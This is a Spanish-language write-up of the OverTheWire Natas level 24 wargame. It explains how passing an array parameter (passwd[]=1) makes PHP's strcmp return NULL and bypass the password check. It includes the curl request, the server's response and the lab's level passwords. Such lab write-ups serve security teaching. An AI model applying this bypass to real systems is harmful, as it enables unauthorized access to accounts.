# Natas 24

#### URL: http://natas24.natas.labs.overthewire.org
#### Credenciales: natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd

``` php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
```

La funcion strcmp compara dos cadenas, devuelve 0 si son iguales, <0 si la cadena 1 es menor que la cadena2, >0 si la cadena 2 es menor que la cadena1.

En php hay algo que se llama "type juggling" por ser un lenguaje debilmente tipado que hace que la variable a la que se le asigna un valor pasa a ser de ese tipo.

Ahora bien php interpreta var[]=1 como un array con un elemento, entonces si pasamos ?passwd[]=1 estamos pasando un array y strcmp intentará comparar un array y un string. Resultado: NULL, lo que retornara 0, tal y como si fuese correcto.

``` bash
curl -u natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd http://natas24.natas.labs.overthewire.org/?passwd[]=1
labs.overthewire.org/?passwd[]=1
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas24", "pass": "MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd" };</script></head>
<body>
<h1>natas24</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
<br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

`natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`
